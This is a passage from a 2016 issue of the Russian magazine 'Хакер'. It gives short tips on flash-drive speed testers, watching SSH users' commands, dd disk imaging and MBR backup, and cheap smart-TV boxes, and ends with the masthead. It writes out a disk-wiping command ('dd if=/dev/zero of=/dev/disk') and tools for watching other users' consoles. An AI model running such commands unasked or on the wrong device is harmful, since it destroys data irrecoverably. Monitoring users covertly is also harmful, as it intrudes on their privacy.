ся объемный файл, считывается и по ходу дела измеряется скорость. Конечно,
при ближайшем рассмотрении все чуть сложнее: учитывается и размер блоков
данных, и значения средней скорости, и другие параметры.
   Обрати внимание, что при запуске любой из перечисленных ниже программ
все данные с носителя будут удалены. Если тестируешь свою флешку, сначала
скопируй с нее информацию, а уже потом приступай к тестам.
  Начнем тестирование с usbflashspeed. Помимо файла с программой, на
сайте ее автора можно найти рейтинги разных флешек и сравнить свои показа-
тели с другими. Это весьма полезно.





                                          Результат работы usbflashspeed

Как понятно из лога, программа определяет скорость для разных размеров
блоков и рисует график. Мы отчетливо видим, что до топовых флешек здесь как
пешком до того самого Китая, где сделали подопытный девайс.
  Попробуем другую программу — H2testw. Ее немецкие корни внушают ощу-
щение надежности! Интерфейс здесь попроще, графиков никаких нет, да и
значений в отчете только необходимый минимум. Именно за это ее и любят:
минимализм — наше все!





                                                Результат работы H2testw

Напоследок я предлагаю посмотреть на программку Check Flash, которую со-
здал украинский программист Михаил Черкес. Она позволяет не только прове-
рять работоспособность флешки, но и измерять мгновенную скорость чтения и
записи, редактировать информацию о разделах, сохранять и восстанавливать
полные образы разделов и всего диска, сохранять образ главного загрузчика
и полностью стирать содержимое. К тому же более быстрого и полного теста
не найдешь. Приятно и то, что тулза тоже очень маленькая — всего 380 Кбайт.
   Запускаем ее и начинаем тестировать нашу подопытную флешку.





                                            Результат работы Check Flash

Как видишь, данных много. Наша флешка, конечно же, не демонстрирует ре-
корды скорости, и цена ее, скорее всего, была копеечная. В целом рекомен-
дую обращать поменьше внимания на дизайн и маркетинговые обещания и
подбирать оптимальное для себя соотношение цены и скорости. Если марка
производителя хоть сколько-нибудь известна, то, скорее всего, ты найдешь в
интернете результаты замеров.

СМОТРИМ, ЧТО ПЕЧАТАЕТ ПОЛЬЗОВАТЕЛЬ В КОНСОЛИ SSH
Представим, что у тебя есть сервер на Linux или UNIX, на который пользователи
логинятся по SSH. Вдруг ты приметил какую-то подозрительную активность или
же просто решил понаблюдать, что происходит в чужой командной строке. Это
возможно, и существует неплохой выбор программных решений.
   Во-первых, многие полезные утилиты уже есть в системе. Одна из них назы-
вается w. Просто набери эту букву в консоли, нажми Enter, и ты увидишь список
подключенных терминалов. В последнем столбце будет отображаться послед-
няя команда, которую ввел пользователь.
   Чуть более сложный вариант — отредактировать файл окружения, чтобы
история сама дампилась в файлик ~/.bash_history. Для этого нужно доба-
вить следующие строки в ~/.bashrc или в ~/.bash_profile:

shopt -s histappend
PROMPT_COMMAND="history -a;$PROMPT_COMMAND"

Еще более мощная вещь — утилита conspy. Она позволяет локально или уда-
ленно следить за активностью пользователя в консоли — что-то вроде VNC, но
для командной строки. Или же можно действительно расшарить экран через
утилиту screen.

ОСВАИВАЕМ КОМАНДУ DD И ЕЕ СЕКРЕТЫ
Команда dd — серьезный старожил в системах, основанных на UNIX. Ее глав-
ное предназначение — это побайтовое копирование. Но благодаря ее гибко-
сти и широчайшему выбору настроек dd можно использовать для массы других
вещей: бэкапить диски, восстанавливать данные из бэкапов, переносить MBR
и делать еще многие интересные штуки.
   Наиболее распространенный вариант использования выглядит примерно так:

dd if=/dev/cdrom of=image.iso

В данном случае синтаксис довольно прост. Параметр if указывает на источ-
ни«к, то есть на то место, откуда копируем. Значение может быть как обычным
файлом, так и файлом устройства (/dev/cdrom). Параметр of указывает на
файл назначения. Принцип тот же: писать можно как в обычный файл, так и на-
прямую в устройство.
   После выполнения такой команды тулза сделает копию диска с названием
image.iso. Но бывает, что диск битый и при появлении ошибки операция за-
писи прервется. Чтобы этого не произошло, можно воспользоваться ключом
conv=noerror.

dd if=/dev/cdrom of=image.iso conv=noerror

Он отключает остановку работы программы, когда та наткнется на ошибку чте-
ния. Таким образом, некоторые данные с диска все же можно будет прочитать.
Тот же синтаксис применяется для клонирования диска.

dd if=/dev/sda of=/dev/sdb bs=4096

В качестве источника и назначения здесь указываются устройства. Главное —
не ошибиться и не перетереть свой же диск. Еще добавился параметр bs. По
сути, это то же побайтовое копирование, только с установленным размером
буфера 4 Кбайт. В данном случае плохо одно: если на диске в 2 Гбайт занято
100 Мбайт, будет сделан образ в 2 Гбайт независимо от размера данных.
   Если необходимо скопировать MBR диска, выполни в консоли следующую
команду:

dd if=/dev/sda of=mbr.img bs=512 count=1

А восстановить область можно более простой командой:

dd if=mbr.img of=/dev/sda

Разберем подробнее ключ bs. Он задает количество байтов, которые будут за-
писаны за один раз. Более абстрактно его можно представлять как размер ку-
ска данных, которые будут записаны или прочитаны. Параметр count опреде-
ляет количество кусков, которые должны быть скопированы.
   Вот еще один полезный трюк. Если мы хотим забить диск нулями, то можем
написать следующее:

dd if=/dev/zero of=/dev/disk

Теперь данные нельзя будет восстановить.
   Также dd применяют для разнообразной автоматизации, например для
бэкапов по расписанию.

КАК СДЕЛАТЬ SMART TV ИЗ ОБЫЧНОГО ТЕЛЕВИЗОРА
Почти у каждого дома стоит, быть может, и не самый современный, но рабо-
чий телевизор. Но вот незадача: смотреть эфирные телеканалы все тяжелее,
а больше аппарат ничего не умеет. Что делать — менять когда-то недешевый
телевизор на новый, еще более дорогой, или же пробовать модернизировать
старый? Для этого сейчас есть самые разные средства.
  Многие предпочитают банально подключить к телевизору компьютер через
порт HDMI. Тогда телевизор становится просто большим монитором, но оста-
ются проблемы с управлением (мышь в таком случае неудобна), да и монитор
из телевизора так себе: количество точек на единицу площади у него меньше,
и иконки становятся огромными. Лучше уж, когда есть приспособленный для
телеэкрана интерфейс. И конечно, компьютер — это большая шумная коробка,
которой у телевизора делать нечего.
   Интересный выбор — различные мини-компьютеры и приставки для теле-
визоров. Производство таких девайсов уже хорошо налажено в Китае. Взять,
к примеру, Android mini PC. Этот «свисток» с Android 4.0 встречается под раз-
ными марками, но суть примерно одинакова.





                                               Android 4.0 mini PC





Воткнув устройство в HDMI (и в USB, если он есть, или в розетку через адап-
тер — для питания) и переключив телевизор на соответствующий вход, поль-
зователь видит перед собой привычный Android. К приставке может прилагать-
ся беспроводная мышь или же миниатюрная клавиатура с тачпадом. Главный
плюс Android в том, что из магазина приложений можно устанавливать любые
плееры, игры, контентные приложения или клиенты соцсетей.
   Есть, конечно, и полноценные приставки, тоже преимущественно на Android.
Они дороже, функции у них разнообразнее, и считается, что работают такие
приставки стабильнее.





                                                            Android TV box





Стоят они меньше, чем пришлось бы доплачивать за модный Smart TV, а поль-
зы от них поболее. Однако скорость работы не всегда оправдывает ожидания,
а глюки и тормоза могут испортить впечатление еще сильнее. Но если хочешь
сэкономить, то это неплохой выход.
                                    18+





  № 9 (212)
                     Илья Русанен            Алексей Глазков
                      Главный редактор         Выпускающий редактор
                          rusanen@glc.ru                  glazkov@glc.ru

                 Андрей Письменный        Евгения Шарипова
                       Шеф-редактор           Литературный редактор
                         pismenny@glc.ru


                       РЕДАКТОРЫ РУБРИК
      Андрей Письменный       Антон «ant» Жуков           Александр «Dr.»
     PC ZONE, СЦЕНА, UNITS          ВЗЛОМ                 Лозовский
          pismenny@glc.ru              zhukov@glc.ru            MALWARE, КОДИНГ,
                                                           PHREAKING
                                                                         lozovsky@glc.ru       Юрий Гольцев           Евгений Зобнин
          ВЗЛОМ                  X-MOBILE
            goltsev@glc.ru                zobnin@glc.ru

        Илья Русанен           Павел Круглов
           КОДИНГ              UNIXOID и SYN/ACK
           rusanen@glc.ru                kruglov@glc.ru


                        MEGANEWS
                             Мария Нефёдова
                                  nefedova.maria@gameland.ru



                                АРТ
                                Анна Королькова
                                      Верстальщик
                                  цифровой версии


                           РЕКЛАМА
                            Мария Самсоненко
                                Менеджер по рекламе
                                      samsonenko@glc.ru


                 РАСПРОСТРАНЕНИЕ И ПОДПИСКА
                     Подробная информация по подписке: paywall@glc.ru
                                 Отдел распространения
                                Наталья Алехина (lapina@glc.ru)
                          Адрес для писем: Москва, 109147, а/я 50




В случае возникновения вопросов по качеству печати: claim@glc.ru. Адрес редакции: 115280, Москва, ул. Ленинская Слобода, д. 19, Омега плаза. Изда-
тель: ООО «Эрсиа»: 606400, Нижегородская обл., Балахнинский р-н, г. Балахна, Советская пл., д. 13. Учредитель: ООО «Принтер Эдишионс», 614111,
Пермский край, г. Пермь, ул. Яблочкова, д. 26. Зарегистрировано в Федеральной службе по надзору в сфере связи, информационных технологий и массо-
вых коммуникаций (Роскомнадзоре), свидетельство ПИ № ФС77-56756 от 29.01.2014 года. Мнение редакции не обязательно совпадает с мнением авто-
ров. Все материалы в номере предоставляются как информация к размышлению. Лица, использующие данную информацию в противозаконных целях,
могут быть привлечены к ответственности. Редакция не несет ответственности за содержание рекламных объявлений в номере. По вопросам лицензи-
рования и получения прав на использование редакционных материалов журнала обращайтесь по адресу: xakep@glc.ru. © Журнал «Хакер», РФ, 2016